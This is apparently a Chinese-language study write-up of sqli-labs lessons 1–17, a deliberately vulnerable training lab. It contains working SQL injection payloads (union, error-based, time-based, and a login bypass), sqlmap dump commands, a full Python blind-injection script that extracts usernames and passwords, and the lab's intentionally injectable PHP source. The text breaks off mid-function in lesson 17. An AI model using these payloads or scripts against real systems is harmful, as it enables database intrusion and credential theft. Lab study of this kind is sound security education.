# SQL-labs Page-1学习

## GET类型

### Less-1

#### 判断是否存在SQL注入，并判断SQL注入的类型

我们首先进入看到界面有 ==Please input the ID as parameter with numeric value==翻译为==请输入ID作为带数值的参数==

我们输入==?id=1==界面发生了改变

![image-20221015195610115](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015195610115.png)

接下来输入==?id=2==界面也随着输入id值的改变，发生了改变。那么就代表我们输入的内容是带入到数据库进行查询了。

![image-20221015195759725](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015195759725.png)

接下来我们需要对注入类型进行判断

首先我们先尝试在后面加入=="==j界面没有改变



![image-20221015200222380](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015200222380.png)



那么现在 我们尝试输入=='==界面发生了改变

![image-20221015200332999](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015200332999.png)

接下来继续输入，使用注释操作 ==--+==

![image-20221015200449855](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015200449855.png)

又恢复了正常界面，那么可以根据结果指定是==字符型==且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询原理简单说一下，联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。

#### 联合查询注入

使用==order by==查询语句

通过查询，如果报错就是超过列数，如果显示正常就是没有超出列数。

输入语句 ==?id=1'order by 3 --+==

![image-20221015201631787](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015201631787.png)



输入语句==?id=1'order by 4 --+==

![image-20221015201730296](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015201730296.png)

接下来进行爆显示位操作==?id=-1'union select 1,2,3--+==

![image-20221015201945080](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015201945080.png)



获取当前数据名和版本号，这个就涉及mysql数据库的一些函数，记得就行

![image-20221015202046539](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015202046539.png)

上面爆出来了数据库名==security==

接下来对于security进行查询

==?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+==

```mysql
group_concat函数常用于select 语句中
讲解博客 https://blog.csdn.net/qq_33323054/article/details/125193170

该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。
```

当我们你输入上面的语句后，画面会发生改变

![image-20221015202540746](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015202540746.png)

根据爆出来的几个表名，可以猜测出想要的数据存在于==users==

接下来输入==?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+==

输入上面的sql语句查询出来了敏感数据 ==username==   ==password==

![image-20221015203116098](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015203116098.png)

最后通过sql语句就可以查询出具体的数据了。==?id=-1' union select 1,2,group_concat(username ,id , password) from users--+==

输入id的目的是将用户名和密码分隔开

![image-20221015203316086](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221015203316086.png)

这样我们就查询出来了用户名和密码的具体数据。

#### index源码分析

**PHP部分**

```php
<?php
//including the Mysql connect parameters.    包括Mysql连接参数。
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables    取变量
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.  将连接参数记录到文件中进行分析。
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
// $sql="SELECT * FROM users WHERE id='0' union select 1,2,3 -- ' LIMIT 0,1";
// $sql="SELECT * FROM users WHERE id='0' union select 1,2,3 # ' LIMIT 0,1";
$result=mysqli_query($con1, $sql);     //mysqli_query() 函数执行某个针对数据库的查询。
    /*返回值：	针对成功的 SELECT、SHOW、DESCRIBE 或 EXPLAIN 查询，将返回一个 mysqli_result 对象。针对其他成功的查询，将返回 TRUE。如果失败，则返回 FALSE*/。
    
$row = mysqli_fetch_array($result, MYSQLI_BOTH);  /*mysqli_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有。返回值：	返回与读取行匹配的字符串数组。如果结果集中没有更多的行则返回 NULL。*/

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-2

**第二关和第一关大体相同，直接套用第一题的思路就可以了，但在尝试的过程中会发现。一个是===数字型注入===，一个是==字符型注入==。这点是需要在注入过程中需要注意的**

#### index源码分析

**PHP**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);


// connectivity 
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else
		{ 	
		echo "Please input the ID as parameter with numeric value";
		}

?>

```

### Less-3

**在第三关中，注入思路与前面的基本也是一致的，但是需要注意的是这里相对于第二关多了括号。其他查询语句基本上是没有差别的。**

**同样的下面是源码分析**

#### index源码

**php部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

###  Less-4

思路一致，这个和第三关基本上是一样的，第三关是==单引号+括号注入==这一关是==双引号加括号注入==

#### index源码

**php部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-5

在第五关中，由于页面没有显示位。无法使用联合查询注入

==显示位的解释==：在一个网站正常的界面，服务端执行sql语句查询数据库中的数据，客户端会将数据显示在页面中，这个显示数据的位置就叫做显示位。



![在这里插入图片描述](https://img-blog.csdnimg.cn/2020092709061776.png#pic_center)



由于不论输入查询语句都是相同的画面，输入错误则不显示，这路就可以判断出来此处不适合用联合查询。这里我们就是用==盲注==比如什么==布尔盲注==，==报错注入==，==时间延迟盲注==这种一般工程量比较大，所以我更加推荐使用sqlmap进行工具注入。

#### 手工注入

下面有一篇博客，是用的==布尔盲注==形式。他使用的是burp这个工具，不用这个工具，直接在URL里面也是可以的。

https://blog.csdn.net/zlloveyouforever/article/details/124504943

这类手工注入的特点就是==猜==

#### sqlmap注入

sqlmap这个工具也是很强大的，在这道题中sqlmap的使用也是更加简单，只需要输入URL地址那些，然后进行扫描和查询操作就可以了

命令步骤

```
sqlmap.py -u "http://sqli/Less-5/?id=1"

sqlmap.py -u "http://sqli/Less-5/?id=1" --current-db

sqlmap.py -u "http://sqli/Less-5/?id=1" -D security --tables

sqlmap.py -u "http://sqli/Less-5/?id=1" -D security -T users --columns

sqlmap.py -u "http://sqli/Less-5/?id=1" -D security -T users -C username,password  --dump

```

最后结果就是这样的

![image-20221016201341555](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221016201341555.png)

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3" color="#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

**在if语句中就说明了，这次没有显示位的原因**

### Less-6

这一关与第五关基本上是一样的，只是在闭合中一个使用的是==单引号==闭合一个使用的是==双引号==闭合

#### index源码

**php**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3"  color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-7

第七关与前面的第五关和第六关不同，当我们输入==?id=1'==时会出现报错，但是不会提示报错信息。然后我们输入==?id=1"==页面显示正常。我们可以断定参数id时单引号字符串。因为单引号破坏了他原有语法结构。随后我们输入==?id=1'--+==发现还是报错，那么我们继续加上括号输入==?id=1')--+==发现还是报错，我们继续猜测会不会是双括号。输入==?id=1'))--+==发现也页面显示正常。那么接下来的操作就和第五关的大体一样了。依然可以采用布尔盲注的方法。

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-8

第八关和第五关基本上是一样的，只是第五关会有报错信息。第八关没有。但是可以根据==you are in ....==进行判断。

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysqli_error($con1));
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-9

在第九关中我们发现，无论我们输入什么界面的值都不获发生改变，这样的情况下。就没有办法使用 ==布尔盲注==我们可以考虑使用==时间盲注==

首先我们可以使用与sleep函数搭配的方法，先构造闭合。在经过我们的尝试以后，当我们输入==?id=1' and sleep(5)--+==时，浏览器真的等待了五秒才成功响应。代表我们确实成功闭合了。接下来的获取数据库信息的操作与前面的就大体一样了。只是条件改为了 ==sleep(5)==

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysqli_error($con1));
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-10

在第10关中，出现的情况与第九关一样，不论我们输入什么仍然显示==you are in ....==那么我们依然是采用时间盲注的方法。

首先对语句进行闭合操作。经过尝试以后会发现==?id=1" and sleep(5)--+==,成功按照我们预想的操作。真的延迟了五秒

后面的步骤与第九关一样了就。

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysqli_error($con1));
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

## POST类型

### Less-11

从这里开始就与前面的初始界面有了较大的差异了。前面的是GET类型，直接在URL里面操作就可以了。这里实现的是一个POST类型，需要我们在登录框里操作，这种情况下，我们通常会直接联想到万能密码==1' or 1=1#==我们输入进去以后提示我们确实登录成功了。

那么我们接下来的操作就与第一关中的一样了，可以采用==联合查询==的方式。

基本一样的操作，这里就细说了

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname);
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity 
	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in\n\n " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		echo 'Your Login name:'. $row['username'];
		echo "<br>";
		echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysqli_error($con1));
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg" />';	
		echo "</font>";  
	}
}

?>
```

### Less-12

在第十二关中，我们发现与第十一关基本一致，不一样的地方在于闭合方式的不同。在我们经过尝试了以后，我们发现，这一条sql语句的闭合方式位==单引号+括号==的形式。

接下来的操作依然可以使用联合查询的方式。思路与第一关一致。

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname."\n");
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity
	$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		echo 'Your Login name:'. $row['username'];
		echo "<br>";
		echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"   />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysqli_error($con1));
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
	}
}

?>
```

### Less-13

在第十三关中，我们发现通过闭合语句。发现没有==回显==那么我们可以==采取报错注入==。

#### 报错注入

**首先判断是否有注入点**

```php
1') or 1=1 #
```

**查询数据库操作**

```php
1') and updatexml(1,concat(0x7e,(select database()),0x7e),1) #
```

**查询表操作**

```php
1') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#
```

**查询列表操作**

```php
1') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='emails' limit 0,1),0x7e),1)#
```

**查询数据操作**

```php
1') and updatexml(1,concat(0x7e,(select email_id from emails limit 0,1),0x7e),1)#
```

==由于报错注入有长度限制 所以用 limit 0,1来一条条爆破数据limit [start(0)],length start省略默认从0开始==

#### index源码

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname."\n");
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity 
	@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		//echo "<br>";
		//echo 'Your Password:' .$row['password'];
		//echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"   />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysqli_error($con1));
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
	}
}

?>
```

### Less-14

在这一关中，基本上与第十三关是一样的，只是采用的闭合方式有区别

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname."\n");
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity
	$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		//echo "<br>";
		//echo 'Your Password:' .$row['password'];
		//echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg" />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysqli_error($con1));
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"  />';	
		echo "</font>";  
	}
}

?>
```

### Less-15

15关与前面的类似，首先还是需要如何闭合，如果使用手工的话，太麻烦，这里可以使用python脚本

这里发现了一个脚本

#### python脚本

```python
import requests

# 获取数据库名长度
def database_len():
    for i in range(1,10):
        url = f"http://127.0.0.12/sqli-labs/Less-15/"
        data = {
            "uname":f"' or length(database())>{i}#",
            "passwd":"1",
            "submit":"Submit"
        }
        headers = {
            "Content-Type":"application/x-www-form-urlencoded",
        }
        r = requests.post(url,data = data ,headers =headers)
        if "flag.jpg" not in r.text:
            print('database_length:', i)
            return i




#获取数据库名
def database_name(databaselen):
     name = ''
     for j in range(1, databaselen+1):
        for i in "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz":
            url = "http://127.0.0.12/sqli-labs/Less-15/"
            data = {
                "uname": f"' or substr(database(),%d,1)='%s'#" % (j, i),
                "passwd": "1",
                "submit": "Submit"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = requests.post(url, data=data, headers=headers)
            if 'flag.jpg' in r.text:
                name = name + i
                break

     print('database_name:', name)


# 获取数据库表
def tables_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            url = "http://127.0.0.12/sqli-labs/Less-15/"
            data = {
                "uname": "' or substr((select group_concat(table_name) from information_schema.tables " \
                  "where table_schema=database()),%d,1)='%s'#" % (j, i),
                "passwd": "1",
                "submit": "Submit"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = requests.post(url, data=data, headers=headers)
            if 'flag.jpg' in r.text:
                name = name + i
                break

    print('table_name:', name)



# 获取表中字段
def columns_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            url = "http://127.0.0.12/sqli-labs/Less-15/"
            data = {
                "uname": f"' or substr((select group_concat(column_name) from information_schema.columns where " \
                  "table_schema=database() and table_name='users'),%d,1)='%s'#" % (j, i),
                "passwd": "1",
                "submit": "Submit"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = requests.post(url, data=data, headers=headers)
            if 'flag.jpg' in r.text:
                name = name + i
                break

    print('column_name:', name)



# 获取username
def username_value():
    name = ''
    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
            url = "http://127.0.0.12/sqli-labs/Less-15/"
            data = {
                "uname": f"' or substr((select group_concat(username) from users),%d,1)='%s'#" % (j, i),
                "passwd": "1",
                "submit": "Submit"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = requests.post(url, data=data, headers=headers)
            if 'flag.jpg' in r.text:
                name = name + i
                break

    print('username_value:', name)



# 获取password
def password_value():
    name = ''
    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
            url = "http://127.0.0.12/sqli-labs/Less-15/"
            data = {
                "uname": f"' or substr((select group_concat(password) from users),%d,1)='%s'#" % (j, i),
                "passwd": "1",
                "submit": "Submit"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = requests.post(url, data=data, headers=headers)
            if 'flag.jpg' in r.text:
                name = name + i
                break

    print('password_value:', name)


if __name__ == '__main__':
    dblen = database_len()
    database_name(dblen)
    tables_name()
    columns_name()
    username_value()
    password_value()

```

#### index 源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname);
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity 
	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in\n\n " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		echo "<br>";
		//echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		//print_r(mysqli_error($con1));
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
	}
}

?>


```

### Less-16

这一关的内容与上一关类似，只是在闭合方式上有区别。依然可以采用==盲注==或者自己写一个python脚本。这里就不写了，参考上一道题就可以了。

#### index源码

**php部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname."\n");
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity
	$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		echo "<br>";
		//echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		echo "</br>";
		echo "</br>";
		//echo "Try again looser";
		//print_r(mysqli_error($con1));
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"  />';	
		echo "</font>";  
	}
}

?>
```

### Less-17

这一关与前面的关有很大的区别，首先我们进入页面是提醒我们重置密码，我们还是按照前面的操作进行操作。发现始终无法得到我们想要的内容。我也很苦恼，我去看了很多师傅的博客，大概知道了，是由于源码对用户名进行了过滤操作

![image-20221018193255074](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221018193255074.png)

```php
function check_input($con1, $value)
{
	if(!empty($value))
	{
		// truncation (see comments)
		$value = substr($value,0,15);
	}

	// Stripslashes if magic quotes enabled
	if (get_magic_quotes_gpc())
	{
		$value = stripslashes($value);
